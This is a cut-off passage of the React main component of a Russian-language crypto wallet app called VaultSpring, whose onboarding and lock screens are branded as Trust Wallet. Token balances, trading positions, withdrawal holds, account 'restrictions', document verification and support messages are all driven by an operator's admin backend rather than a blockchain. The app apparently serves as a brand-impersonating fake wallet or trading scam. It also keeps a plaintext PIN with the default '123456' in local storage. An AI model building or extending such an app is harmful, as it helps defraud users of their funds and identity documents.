import React, { useState, useEffect } from 'react';
import { AndroidFrame } from './components/AndroidFrame';
import { TopBar } from './components/TopBar';
import { WalletHero } from './components/WalletHero';
import { TokenList } from './components/TokenList';
import { BottomNavBar, BottomTabType } from './components/BottomNavBar';
import { TokenDetailModal } from './components/TokenDetailModal';
import { SendModal } from './components/modals/SendModal';
import { ReceiveModal } from './components/modals/ReceiveModal';
import { SellModal, VerificationData } from './components/modals/SellModal';
import { ActivityModal, ActivityItem } from './components/modals/ActivityModal';
import { WalletDetailsModal } from './components/modals/WalletDetailsModal';
import { NetworkFilterModal } from './components/modals/NetworkFilterModal';
import { QRScannerModal } from './components/modals/QRScannerModal';
import { NotificationsModal } from './components/modals/NotificationsModal';
import { ManageTokensModal } from './components/modals/ManageTokensModal';
import { TrustWalletOnboarding } from './components/onboarding/TrustWalletOnboarding';
import { TrustWalletLockScreen } from './components/lock/TrustWalletLockScreen';
import { SwapTab } from './components/tabs/SwapTab';
import { EarnTab } from './components/tabs/EarnTab';
import { SettingsTab } from './components/tabs/SettingsTab';

import {
  INITIAL_WALLETS,
  INITIAL_TOKENS,
  INITIAL_NFTS,
  INITIAL_TRANSACTIONS,
  INITIAL_STAKING_POOLS,
  INITIAL_DAPPS,
  INITIAL_NOTIFICATIONS
} from './data/mockWalletData';
import { Token, NFTItem, Transaction, StakingPool, DAppItem, WalletAccount, AppNotification, NetworkType } from './types/wallet';
import { StakingProAsset, StakingProPosition, StakingActiveDeposit } from './types/stakingPro';
import { TRADING_INSTRUMENTS, INITIAL_ACTIVE_DEPOSITS, INITIAL_PRO_POSITIONS } from './data/stakingProData';
import { fetchLiveCryptoPrices } from './services/priceService';
import { registerWalletWithServer, syncWalletWithServer, playChimeSound } from './services/walletSyncService';

export default function App() {
  // 1 PHONE = 1 WALLET STATE & REGISTRATION / PIN SECURITY
  const [isRegistered, setIsRegistered] = useState<boolean>(() => {
    const reg = localStorage.getItem('vaultspring_is_registered');
    return reg === 'true';
  });

  const [pinCode, setPinCode] = useState<string>(() => {
    return localStorage.getItem('vaultspring_pin') || '123456';
  });

  const [isLocked, setIsLocked] = useState<boolean>(() => {
    const reg = localStorage.getItem('vaultspring_is_registered');
    // If registered, require PIN unlock on app entry/reload!
    return reg === 'true';
  });

  const [currentWallet, setCurrentWallet] = useState<WalletAccount>(() => {
    const saved = localStorage.getItem('vaultspring_wallet');
    if (saved) {
      try {
        const parsed: WalletAccount = JSON.parse(saved);
        return {
          ...parsed,
          tronAddress: parsed.tronAddress || 'TYDZSxdvjW6H8HkWtK5J92mNqP7rS8tVwX'
        };
      } catch {
        return INITIAL_WALLETS[0];
      }
    }
    return INITIAL_WALLETS[0];
  });

  // TOKENS STATE - Merge all available tokens into saved state
  const [tokens, setTokens] = useState<Token[]>(() => {
    const saved = localStorage.getItem('vaultspring_tokens');
    if (saved) {
      try {
        const parsed: Token[] = JSON.parse(saved);
        const existingIds = new Set(parsed.map((t) => t.id));
        const missing = INITIAL_TOKENS.filter((t) => !existingIds.has(t.id));
        if (missing.length > 0) {
          const merged = [...parsed, ...missing];
          localStorage.setItem('vaultspring_tokens', JSON.stringify(merged));
          return merged;
        }
        return parsed;
      } catch {
        return INITIAL_TOKENS;
      }
    }
    return INITIAL_TOKENS;
  });

  // TRANSACTIONS STATE
  const [transactions, setTransactions] = useState<Transaction[]>(() => {
    const saved = localStorage.getItem('vaultspring_txs');
    return saved ? JSON.parse(saved) : INITIAL_TRANSACTIONS;
  });

  // STAKING POOLS & DEPOSITS STATE
  const [stakingPools, setStakingPools] = useState<StakingPool[]>(() => {
    const saved = localStorage.getItem('vaultspring_staking');
    return saved ? JSON.parse(saved) : INITIAL_STAKING_POOLS;
  });

  const [activeDeposits, setActiveDeposits] = useState<StakingActiveDeposit[]>(() => {
    const saved = localStorage.getItem('vaultspring_active_deposits');
    return saved ? JSON.parse(saved) : [];
  });

  const [proPositions, setProPositions] = useState<StakingProPosition[]>(() => {
    const saved = localStorage.getItem('vaultspring_pro_positions');
    return saved ? JSON.parse(saved) : [];
  });

  // Full multi-market catalog (Crypto / Forex / Commodities / Stocks / Indices)
  // until the operator-managed catalog arrives from the backend.
  const [proAssets, setProAssets] = useState<StakingProAsset[]>(TRADING_INSTRUMENTS);

  const [unlockPeriodHours, setUnlockPeriodHours] = useState(48);

  // Load unlock period from server config
  React.useEffect(() => {
    fetch('/api/config')
      .then((r) => r.json())
      .then((data) => {
        if (data.unlockPeriodHours) setUnlockPeriodHours(data.unlockPeriodHours);
      })
      .catch(() => {});
  }, []);

  // Load the operator-configured Trade Pro catalog + this wallet's positions from
  // the admin backend, so everything managed in the admin panel shows up here.
  const loadStakingPro = React.useCallback(() => {
    const addr = currentWallet?.address;
    if (!addr) return;
    fetch(`/api/admin/staking-pro/public?address=${encodeURIComponent(addr)}`)
      .then((r) => (r.ok ? r.json() : null))
      .then((d: any) => {
        if (!d) return;
        if (Array.isArray(d.assets) && d.assets.length) setProAssets(d.assets as StakingProAsset[]);
        // Server is authoritative only for wallets the backend recognizes.
        if (d.known && Array.isArray(d.positions)) {
          setProPositions(d.positions.filter((p: any) => p.status === 'open') as StakingProPosition[]);
        }
      })
      .catch(() => {});
  }, [currentWallet?.address]);

  useEffect(() => { loadStakingPro(); }, [loadStakingPro]);

  // WALLET STATUS (pending withdrawals, restrictions, support messages)
  interface WalletStatus {
    pendingWithdrawals: { id: string; asset: string; amount: number; status: string; createdAt: number; txHash: string | null }[];
    restrictions: { id: string; type: string; reason: string; createdAt: number }[];
    supportMessages: { id: string; subject: string; status: string; createdAt: number }[];
  }
  const [walletStatus, setWalletStatus] = useState<WalletStatus>({ pendingWithdrawals: [], restrictions: [], supportMessages: [] });

  const loadWalletStatus = React.useCallback(() => {
    const addr = currentWallet?.address;
    if (!addr) return;
    fetch(`/api/admin/wallet-status/public?address=${encodeURIComponent(addr)}`)
      .then((r) => (r.ok ? r.json() : null))
      .then((d: any) => {
        if (d) setWalletStatus(d as WalletStatus);
      })
      .catch(() => {});
  }, [currentWallet?.address]);

  useEffect(() => { loadWalletStatus(); }, [loadWalletStatus]);

  // NOTIFICATIONS STATE
  const [notifications, setNotifications] = useState<AppNotification[]>(() => {
    const saved = localStorage.getItem('vaultspring_notifications');
    return saved ? JSON.parse(saved) : [];
  });

  // VERIFICATION STATE
  const [isVerified, setIsVerified] = useState<boolean>(() => {
    return localStorage.getItem('vaultspring_verified') === 'true';
  });
  const [verificationData, setVerificationData] = useState<VerificationData | null>(() => {
    const saved = localStorage.getItem('vaultspring_verification');
    return saved ? JSON.parse(saved) : null;
  });
  const [verificationStatus, setVerificationStatus] = useState<'none' | 'pending' | 'approved' | 'rejected'>('none');
  const [showVerificationModal, setShowVerificationModal] = useState(false);
  const [showActivityModal, setShowActivityModal] = useState(false);
  const [activityItems, setActivityItems] = useState<ActivityItem[]>([]);

  // Fetch verification status from server
  useEffect(() => {
    if (!currentWallet?.address) return;
    const fetchStatus = () => {
      fetch(`/api/wallet/verify/status?address=${currentWallet.address}`)
        .then(r => r.json())
        .then(data => setVerificationStatus(data.status || 'none'))
        .catch(() => {});
    };
    fetchStatus();
    const interval = setInterval(fetchStatus, 60000); // poll every 60s
    return () => clearInterval(interval);
  }, [currentWallet?.address]);

  // Build activity items from walletStatus and verification
  useEffect(() => {
    const items: ActivityItem[] = [];
    
    // Pending withdrawals
    walletStatus.pendingWithdrawals.forEach(w => {
      items.push({
        id: `wd-${w.id}`,
        type: 'withdrawal',
        status: w.status === 'completed' ? 'completed' : w.status === 'rejected' ? 'rejected' : 'processing',
        title: 'Вывод средств',
        message: `${w.amount} ${w.asset} — ${w.status === 'completed' ? 'Выполнено' : w.status === 'rejected' ? 'Отклонено' : 'В обработке'}`,
        time: new Date(w.createdAt).toLocaleDateString('ru-RU'),
        read: false
      });
    });

    // Verification status
    if (verificationStatus === 'pending') {
      items.push({
        id: 'ver-pending',
        type: 'verification',
        status: 'processing',
        title: 'Верификация',
        message: 'Документы на проверке',
        time: 'Недавно',
        read: false
      });
    } else if (verificationStatus === 'rejected') {
      items.push({
        id: 'ver-rejected',
        type: 'verification',
        status: 'needs_support',
        title: 'Верификация',
        message: 'Требуется связаться с поддержкой',
        time: 'Недавно',
        read: false
      });
    }

    // Support messages
    walletStatus.supportMessages.forEach(s => {
      items.push({
        id: `sup-${s.id}`,
        type: 'support',
        status: 'needs_support',
        title: s.subject,
        message: 'Новое сообщение от поддержки',
        time: new Date(s.createdAt).toLocaleDateString('ru-RU'),
        read: false
      });
    });

    setActivityItems(items);
  }, [walletStatus, verificationStatus]);

  const handleVerificationSubmit = (data: VerificationData) => {
    setVerificationData(data);
    setVerificationStatus('pending'); // optimistic update
    localStorage.setItem('vaultspring_verification', JSON.stringify(data));
    // Also send to server for admin review
    fetch('/api/wallet/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        address: currentWallet.address,
        ...data
      })
    }).catch(() => {});
  };

  // NAVIGATION & MODALS STATE
  const [activeTab, setActiveTab] = useState<BottomTabType>('home');
  const [currentNetwork, setCurrentNetwork] = useState<NetworkType>('All Networks');
  const [selectedTokenDetail, setSelectedTokenDetail] = useState<Token | null>(null);

  // REAL LIVE PRICES POLLING & STATE
  const [isUpdatingPrices, setIsUpdatingPrices] = useState(false);
  const [lastPriceUpdate, setLastPriceUpdate] = useState<Date | null>(null);

  const refreshLivePrices = async () => {
    setIsUpdatingPrices(true);
    try {
      const prices = await fetchLiveCryptoPrices();
      if (prices) {
        setTokens((prev) => {
          return prev.map((tok) => {
            let pData = null;
            if (tok.id === 'tether-trc20') {
              pData = prices['USDT-TRC20'] || prices['USDT'];
            } else if (prices[tok.symbol]) {
              pData = prices[tok.symbol];
            }

            if (pData) {
              const newPrice = pData.price;
              const newChange = pData.change24h;
              const newBalUsd = tok.balance * newPrice;
              const currentSparkline = tok.sparkline || [];
              const newSparkline = [...currentSparkline.slice(1), newPrice];
              return {
                ...tok,
                price: newPrice,
                change24h: newChange,
                balanceUsd: newBalUsd,
                sparkline: newSparkline.length >= 7 ? newSparkline : currentSparkline
              };
            }
            return tok;
          });
        });

        // Update Pro Assets with live market data
        setProAssets((prev) =>
          prev.map((asset) => {
            if (prices[asset.symbol]) {
              return {
                ...asset,
                currentPrice: prices[asset.symbol].price,
                change24h: prices[asset.symbol].change24h
              };
            }
            return asset;
          })
        );

        setLastPriceUpdate(new Date());
      }
    } catch (e) {
      console.warn('Failed to pull live crypto prices:', e);
    } finally {
      setIsUpdatingPrices(false);
    }
  };

  // Fetch prices immediately on mount, and schedule polling every 20 seconds
  useEffect(() => {
    refreshLivePrices();
    const timer = setInterval(() => {
      refreshLivePrices();
    }, 20000);
    return () => clearInterval(timer);
  }, []);

  const [modalSend, setModalSend] = useState<{ open: boolean; initialToken?: Token }>({ open: false });
  const [modalReceive, setModalReceive] = useState<{ open: boolean; initialToken?: Token }>({ open: false });
  const [modalSell, setModalSell] = useState(false);
  const [modalWalletSwitcher, setModalWalletSwitcher] = useState(false);
  const [modalNetworkFilter, setModalNetworkFilter] = useState(false);
  const [modalQRScanner, setModalQRScanner] = useState(false);
  const [modalNotifications, setModalNotifications] = useState(false);
  const [modalManageTokens, setModalManageTokens] = useState(false);
  const [fiatCurrency, setFiatCurrency] = useState('USD');

  // Sync to localStorage
  useEffect(() => {
    if (currentWallet) {
      localStorage.setItem('vaultspring_wallet', JSON.stringify(currentWallet));
    }
  }, [currentWallet]);

  const handleOnboardingComplete = (newWallet: WalletAccount, newPin: string) => {
    setCurrentWallet(newWallet);
    setPinCode(newPin);
    setIsRegistered(true);
    setIsLocked(false);

    // Initial wallet balance is strictly 0.00 for all tokens
    const zeroTokens = INITIAL_TOKENS.map((t) => ({ ...t, balance: 0, balanceUsd: 0 }));
    setTokens(zeroTokens);
    setTransactions([]);

    localStorage.setItem('vaultspring_is_registered', 'true');
    localStorage.setItem('vaultspring_pin', newPin);
    localStorage.setItem('vaultspring_wallet', JSON.stringify(newWallet));
    localStorage.setItem('vaultspring_tokens', JSON.stringify(zeroTokens));
    localStorage.setItem('vaultspring_txs', JSON.stringify([]));

    // Register with backend peer-to-peer ledger
    registerWalletWithServer(newWallet, zeroTokens).catch(() => {});
  };

  const handleUnlock = () => {
    setIsLocked(false);
  };

  const handleUpdatePin = (newPin: string) => {
    setPinCode(newPin);
    localStorage.setItem('vaultspring_pin', newPin);
  };

  const handleResetWallet = () => {
    localStorage.removeItem('vaultspring_is_registered');
    localStorage.removeItem('vaultspring_pin');
    localStorage.removeItem('vaultspring_wallet');
    localStorage.removeItem('vaultspring_tokens');
    localStorage.removeItem('vaultspring_txs');
    setIsRegistered(false);
    setIsLocked(false);
    const zeroTokens = INITIAL_TOKENS.map((t) => ({ ...t, balance: 0, balanceUsd: 0 }));
    setTokens(zeroTokens);
    setTransactions([]);
  };

  const handleFaucetFunded = (symbol: string, amount: number) => {
    setTokens((prev) =>
      prev.map((t) => {
        if (t.symbol === symbol) {
          const newBal = t.balance + amount;
          return { ...t, balance: newBal, balanceUsd: newBal * t.price };
        }
        return t;
      })
    );

    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'Тестовые токены получены',
      message: `Зачислено +${amount} ${symbol} в ваш кошелек`,
      time: 'Только что',
      type: 'reward',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);
  };

  // Real-time peer-to-peer sync polling with backend ledger (every 3 seconds)
  useEffect(() => {
    if (!currentWallet || !currentWallet.address) return;

    registerWalletWithServer(currentWallet, tokens).catch(() => {});

    const pollInterval = setInterval(async () => {
      const res = await syncWalletWithServer(currentWallet);
      if (res && res.success && res.exists) {
        // Sync token balances from backend
        if (res.balances) {
          setTokens((prev) =>
            prev.map((t) => {
              // Use balanceKey if available, otherwise fall back to symbol
              const key = t.balanceKey || t.symbol;
              if (res.balances[key] !== undefined && res.balances[key] !== t.balance) {
                const newBal = res.balances[key];
                return {
                  ...t,
                  balance: newBal,
                  balanceUsd: newBal * t.price
                };
              }
              return t;
            })
          );
        }

        // Merge incoming peer transactions
        if (Array.isArray(res.transactions) && res.transactions.length > 0) {
          setTransactions((prev) => {
            const existingIds = new Set(prev.map((tx) => tx.id));
            const newIncoming = res.transactions.filter((tx) => !existingIds.has(tx.id));
            if (newIncoming.length > 0) {
              playChimeSound();
              return [...newIncoming, ...prev];
            }
            return prev;
          });
        }

        // Push notifications
        if (Array.isArray(res.alerts) && res.alerts.length > 0) {
          setNotifications((prev) => [...res.alerts, ...prev]);
        }
      }
    }, 3000);

    return () => clearInterval(pollInterval);
  }, [currentWallet]);

  useEffect(() => {
    localStorage.setItem('vaultspring_tokens', JSON.stringify(tokens));
  }, [tokens]);

  useEffect(() => {
    localStorage.setItem('vaultspring_txs', JSON.stringify(transactions));
  }, [transactions]);

  useEffect(() => {
    localStorage.setItem('vaultspring_staking', JSON.stringify(stakingPools));
  }, [stakingPools]);

  useEffect(() => {
    localStorage.setItem('vaultspring_active_deposits', JSON.stringify(activeDeposits));
  }, [activeDeposits]);

  useEffect(() => {
    localStorage.setItem('vaultspring_pro_positions', JSON.stringify(proPositions));
  }, [proPositions]);

  useEffect(() => {
    localStorage.setItem('vaultspring_notifications', JSON.stringify(notifications));
  }, [notifications]);

  // Dynamic Portfolio Calculations based on real live prices
  const totalBalanceUsd = tokens.reduce((acc, t) => acc + t.balanceUsd, 0);
  const usdtBalance = tokens.find((t) => t.symbol === 'USDT')?.balanceUsd || 0;
  const change24hUsd = tokens.reduce((acc, t) => acc + (t.balanceUsd * (t.change24h / 100)), 0);
  const change24hPercent = totalBalanceUsd > 0 ? (change24hUsd / totalBalanceUsd) * 100 : 0;
  const unreadCount = notifications.filter((n) => !n.read).length;

  // Staking balance: sum of active deposits (amountUsd + accruedRewardUsd)
  const stakingBalanceUsd = activeDeposits
    .filter((d) => d.status === 'active' || d.status === 'pending_unlock')
    .reduce((acc, d) => acc + d.amountUsd + d.accruedRewardUsd, 0);
  const stakingProfitUsd = activeDeposits
    .filter((d) => d.status === 'active' || d.status === 'pending_unlock')
    .reduce((acc, d) => acc + d.accruedRewardUsd, 0);

  // Trading balance: sum of open positions collateral + unrealized PnL
  const tradingPositions = proPositions.filter((p) => p.status === 'open');
  const tradingCollateralUsd = tradingPositions.reduce((acc, p) => acc + p.collateralUsd, 0);
  const tradingUnrealizedPnl = tradingPositions.reduce((acc, p) => {
    if (p.entryPrice <= 0) return acc;
    const priceChange = p.direction === 'long'
      ? (p.currentPrice - p.entryPrice) / p.entryPrice
      : (p.entryPrice - p.currentPrice) / p.entryPrice;
    return acc + priceChange * p.positionSizeUsd;
  }, 0);
  const tradingBalanceUsd = tradingCollateralUsd + tradingUnrealizedPnl;

  // Available (free) balance = total - staked - trading collateral
  const stakedAmountBySymbol: Record<string, number> = {};
  activeDeposits
    .filter((d) => d.status === 'active' || d.status === 'pending_unlock')
    .forEach((d) => {
      stakedAmountBySymbol[d.tokenSymbol] = (stakedAmountBySymbol[d.tokenSymbol] || 0) + d.amount;
    });
  const availableBalanceUsd = tokens.reduce((acc, t) => {
    const staked = stakedAmountBySymbol[t.symbol] || 0;
    const availableAmount = Math.max(0, t.balance - staked);
    return acc + availableAmount * t.price;
  }, 0) - tradingCollateralUsd;

  // Trade Pro collateral is USDT (single base currency for every market), so the
  // free margin the trading screen can use is the free USDT balance — not the
  // whole portfolio value. USDT exists on several networks, so every row counts.
  // Wallets without any USDT row keep the previous portfolio-based fallback.
  const usdtCollateralBalance = tokens
    .filter((t) => t.symbol === 'USDT')
    .reduce((acc, t) => acc + (t.balanceUsd || t.balance * t.price), 0);
  const tradeCollateralAvailableUsd = tokens.some((t) => t.symbol === 'USDT')
    ? Math.max(0, usdtCollateralBalance - tradingCollateralUsd)
    : Math.max(0, availableBalanceUsd);

  // Keep detail modal token updated with live prices
  const activeDetailToken = selectedTokenDetail
    ? tokens.find((t) => t.id === selectedTokenDetail.id) || selectedTokenDetail
    : null;

  // Handlers for transactions & balances
  const handleSendSuccess = (newTx: Transaction, updatedToken: Token) => {
    setTransactions((prev) => [newTx, ...prev]);
    setTokens((prev) => prev.map((t) => (t.id === updatedToken.id ? updatedToken : t)));
    // Add notification
    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'В обработке',
      message: `Отправлено ${newTx.amount} ${newTx.tokenSymbol} на ${newTx.toAddress.substring(0, 10)}... Ожидает подтверждения`,
      time: 'Только что',
      type: 'tx',
      subtype: 'send',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);
  };

  const handleSellSuccess = (newTx: Transaction, updatedToken: Token) => {
    setTransactions((prev) => [newTx, ...prev]);
    setTokens((prev) => prev.map((t) => (t.id === updatedToken.id ? updatedToken : t)));
    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'Crypto Sold (Cashout)',
      message: `Sold ${newTx.amount.toFixed(4)} ${newTx.tokenSymbol} for cashout to your bank account`,
      time: 'Just now',
      type: 'tx',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);
  };

  const handleSwapSuccess = (newTx: Transaction, updatedFrom: Token, updatedTo: Token) => {
    setTransactions((prev) => [newTx, ...prev]);
    setTokens((prev) =>
      prev.map((t) => {
        if (t.id === updatedFrom.id) return updatedFrom;
        if (t.id === updatedTo.id) return updatedTo;
        return t;
      })
    );
    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'Обмен выполнен',
      message: `Обменяно ${newTx.amount} ${newTx.tokenSymbol} через DEX`,
      time: 'Только что',
      type: 'tx',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);
  };

  // STAKING & TRADE PRO (multi-market catalog) HANDLERS
  const handleClassicDepositSuccess = (deposit: StakingActiveDeposit, updatedToken: Token, tx: Transaction) => {
    setActiveDeposits((prev) => [deposit, ...prev]);
    setTokens((prev) => prev.map((t) => (t.id === updatedToken.id ? updatedToken : t)));
    setTransactions((prev) => [tx, ...prev]);

    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'Стейкинг активирован',
      message: `Размещено ${deposit.amount} ${deposit.tokenSymbol} в валидаторе`,
      time: 'Только что',
      type: 'reward',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);
  };

  const handleClassicUnstakeSuccess = (depositId: string, returnAmount: number, symbol: string) => {
    setActiveDeposits((prev) => prev.filter((d) => d.id !== depositId));
    setTokens((prev) =>
      prev.map((t) => {
        if (t.symbol === symbol) {
          const newBal = t.balance + returnAmount;
          return { ...t, balance: newBal, balanceUsd: newBal * t.price };
        }
        return t;
      })
    );

    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'Вывод из стейкинга',
      message: `Запрос на разблокировку ${returnAmount} ${symbol} отправлен в сеть`,
      time: 'Только что',
      type: 'tx',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);
  };

  // Handle unstake request - set status to pending_unlock
  const handleUnstakeRequest = (deposit: StakingActiveDeposit) => {
    setActiveDeposits((prev) =>
      prev.map((d) => (d.id === deposit.id ? deposit : d))
    );

    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'Запрос на вывод отправлен',
      message: `Разблокировка ${deposit.amount} ${deposit.tokenSymbol} займёт 48 часов`,
      time: 'Только что',
      type: 'tx',
      subtype: 'send',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);
  };

  // Check for completed unlocks (48 hours passed)
  React.useEffect(() => {
    const checkUnlocks = () => {
      const now = Date.now();
      const unlockDuration = 48 * 60 * 60 * 1000; // 48 hours
      
      setActiveDeposits((prev) => {
        const completed: StakingActiveDeposit[] = [];
        const remaining = prev.filter((d) => {
          if (d.status === 'pending_unlock' && d.unlockRequestedAt) {
            if (now - d.unlockRequestedAt >= unlockDuration) {
              completed.push(d);
              return false;
            }
          }
          return true;
        });
        
        // Process completed unlocks
        completed.forEach((dep) => {
          // Return funds to token balance
          setTokens((prevTokens) =>
            prevTokens.map((t) => {
              if (t.symbol === dep.tokenSymbol) {
                const newBal = t.balance + dep.amount;
                return { ...t, balance: newBal, balanceUsd: newBal * t.price };
              }
              return t;
            })
          );
          
          // Add notification
          const alert: AppNotification = {
            id: `n-${Date.now()}-${dep.id}`,
            title: 'Вывод завершён',
            message: `${dep.amount} ${dep.tokenSymbol} разблокированы и зачислены на баланс`,
            time: 'Только что',
            type: 'tx',
            subtype: 'receive',
            read: false
          };
          setNotifications((prev) => [alert, ...prev]);
        });
        
        return remaining;
      });
    };
    
    // Check every minute
    const interval = setInterval(checkUnlocks, 60 * 1000);
    return () => clearInterval(interval);
  }, []);

  const handleOpenProPosition = (position: StakingProPosition, requiredCollateralUsd: number, tx: Transaction) => {
    setProPositions((prev) => [position, ...prev]);
    setTransactions((prev) => [tx, ...prev]);

    // Deduct collateral from USDT or available crypto
    setTokens((prev) => {
      const usdt = prev.find((t) => t.symbol === 'USDT');
      if (usdt && usdt.balance >= requiredCollateralUsd) {
        return prev.map((t) =>
          t.symbol === 'USDT'
            ? { ...t, balance: t.balance - requiredCollateralUsd, balanceUsd: (t.balance - requiredCollateralUsd) * t.price }
            : t
        );
      }
      return prev;
    });

    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'Trade Pro: Стратегия открыта',
      message: `Позиция ${position.direction.toUpperCase()} (${position.ticker || position.assetSymbol}) ${position.leverage}x открыта`,
      time: 'Только что',
      type: 'tx',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);

    // Persist to the admin backend (journal-reserves collateral, audited) then reconcile.
    fetch('/api/admin/staking-pro/client/open', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        address: currentWallet?.address, id: position.id, assetId: position.assetId,
        direction: position.direction, executionType: position.executionType, leverage: position.leverage,
        positionSizeUsd: position.positionSizeUsd, entryPrice: position.entryPrice,
        takeProfitPrice: position.takeProfitPrice, stopLossPrice: position.stopLossPrice,
      }),
    }).then(() => loadStakingPro()).catch(() => {});
  };

  const handleCloseProPosition = (positionId: string, returnCollateral: number, pnlUsd: number) => {
    setProPositions((prev) => prev.filter((p) => p.id !== positionId));

    // Return collateral + net PnL back to USDT
    setTokens((prev) =>
      prev.map((t) => {
        if (t.symbol === 'USDT') {
          const newBal = t.balance + returnCollateral;
          return { ...t, balance: newBal, balanceUsd: newBal * t.price };
        }
        return t;
      })
    );

    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'Trade Pro: Позиция закрыта',
      message: `Финансовый результат: ${pnlUsd >= 0 ? '+' : ''}$${pnlUsd.toFixed(2)} USD`,
      time: 'Только что',
      type: 'tx',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);

    fetch('/api/admin/staking-pro/client/close', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: currentWallet?.address, positionId }),
    }).then(() => loadStakingPro()).catch(() => {});
  };

  const handleUpdateProTpSl = (positionId: string, newTp: number, newSl: number) => {
    setProPositions((prev) =>
      prev.map((p) => (p.id === positionId ? { ...p, takeProfitPrice: newTp, stopLossPrice: newSl } : p))
    );

    const alert: AppNotification = {
      id: `n-${Date.now()}`,
      title: 'Trade Pro: TP / SL обновлен',
      message: `Уровни Take-Profit ($${newTp}) и Stop-Loss ($${newSl}) сохранены`,
      time: 'Только что',
      type: 'tx',
      read: false
    };
    setNotifications((prev) => [alert, ...prev]);

    fetch('/api/admin/staking-pro/client/update', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: currentWallet?.address, positionId, takeProfitPrice: newTp, stopLossPrice: newSl }),
    }).then(() => loadStakingPro()).catch(() => {});
  };

  const handleAddCustomToken = (newToken: Token) => {
    setTokens((prev) => [newToken, ...prev]);
  };

  const handleToggleTokens = (enabledIds: string[]) => {
    const newTokens = INITIAL_TOKENS.filter((t) => enabledIds.includes(t.id));
    // Preserve balances for tokens that were already in the wallet
    const balancedTokens = newTokens.map((t) => {
      const existing = tokens.find((et) => et.id === t.id);
      return existing || t;
    });
    setTokens(balancedTokens);
  };

  // 1. TRUST WALLET REGISTRATION & ONBOARDING (1 Phone = 1 Wallet)
  if (!isRegistered) {
    return (
      <AndroidFrame>
        <TrustWalletOnboarding
          onComplete={handleOnboardingComplete}
        />
      </AndroidFrame>
    );
  }

  // 2. TRUST WALLET PIN LOCK SCREEN (Prompt for remembered 6-digit PIN)
  if (isLocked) {
    return (
      <AndroidFrame>
        <TrustWalletLockScreen
          savedPin={pinCode}
          walletName={currentWallet.name}
          onUnlock={handleUnlock}
          onResetWallet={handleResetWallet}
          onBack={() => setIsLocked(false)}
        />
      </AndroidFrame>
    );
  }

  return (
    <AndroidFrame>
      {/* Top Bar (Wallet Switcher, Network, QR, Notifications) */}
      <TopBar
        currentWallet={currentWallet}
        currentNetwork={currentNetwork}
        unreadCount={unreadCount}
        onOpenWalletSwitcher={() => setModalWalletSwitcher(true)}
        onOpenNetworkFilter={() => setModalNetworkFilter(true)}
        onOpenQRScanner={() => setModalQRScanner(true)}
        onOpenNotifications={() => setModalNotifications(true)}
      />

      {/* Main Tab Screen Content */}
      <div className="flex-1 overflow-hidden flex flex-col relative pb-16">
        {activeTab === 'home' && (
          <div className="flex-1 overflow-y-auto flex flex-col">
            {/* Balance Hero & Action Buttons */}
            <WalletHero
              totalBalanceUsd={availableBalanceUsd}
              change24hUsd={change24hUsd}
              change24hPercent={change24hPercent}
              stakingBalanceUsd={stakingBalanceUsd}
              stakingProfitUsd={stakingProfitUsd}
              tradingBalanceUsd={tradingBalanceUsd}
              tradingProfitUsd={tradingUnrealizedPnl}
              isUpdatingPrices={isUpdatingPrices}
              onRefreshPrices={refreshLivePrices}
              lastPriceUpdate={lastPriceUpdate}
              onOpenSend={() => setModalSend({ open: true })}
              onOpenReceive={() => setModalReceive({ open: true })}
              onOpenSell={() => setModalSell(true)}
              onOpenSwap={() => setActiveTab('swap')}
              onOpenEarn={() => setActiveTab('earn')}
              verificationStatus={verificationStatus}
              onOpenVerification={() => setShowVerificationModal(true)}
              activityCount={activityItems.filter(i => !i.read).length}
              onOpenActivity={() => setShowActivityModal(true)}
            />

            {/* Wallet Status Indicators (pending withdrawals, restrictions, support) */}
            {(walletStatus.pendingWithdrawals.length > 0 || walletStatus.restrictions.length > 0 || walletStatus.supportMessages.length > 0) && (
              <div className="px-4 py-2 space-y-2">
                {walletStatus.restrictions.length > 0 && (
                  <div className="bg-rose-500/10 border border-rose-500/20 rounded-xl px-3 py-2 flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full bg-rose-500 animate-pulse" />
                    <span className="text-xs text-rose-300 font-medium">
                      {walletStatus.restrictions.length === 1 ? 'Аккаунт заблокирован' : `${walletStatus.restrictions.length} активных ограничений`}
                    </span>
                  </div>
                )}

                {walletStatus.pendingWithdrawals.length > 0 && (
                  <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl px-3 py-2 flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full bg-amber-500" />
                    <span className="text-xs text-amber-300 font-medium">
                      {walletStatus.pendingWithdrawals.length} {walletStatus.pendingWithdrawals.length === 1 ? 'вывод в обработке' : 'выводов в обработке'}
                    </span>
                  </div>
                )}

                {walletStatus.supportMessages.length > 0 && (
                  <div className="bg-blue-500/10 border border-blue-500/20 rounded-xl px-3 py-2 flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full bg-blue-500" />
                    <span className="text-xs text-blue-300 font-medium">
                      {walletStatus.supportMessages.length} {walletStatus.supportMessages.length === 1 ? 'сообщение от поддержки' : 'сообщений от поддержки'}
                    </span>
                  </div>
                )}
              </div>
            )}

            {/* Token List & Tabs */}
            <TokenList
              tokens={tokens}
              nfts={INITIAL_NFTS}
              transactions={transactions}
              currentNetwork={currentNetwork}
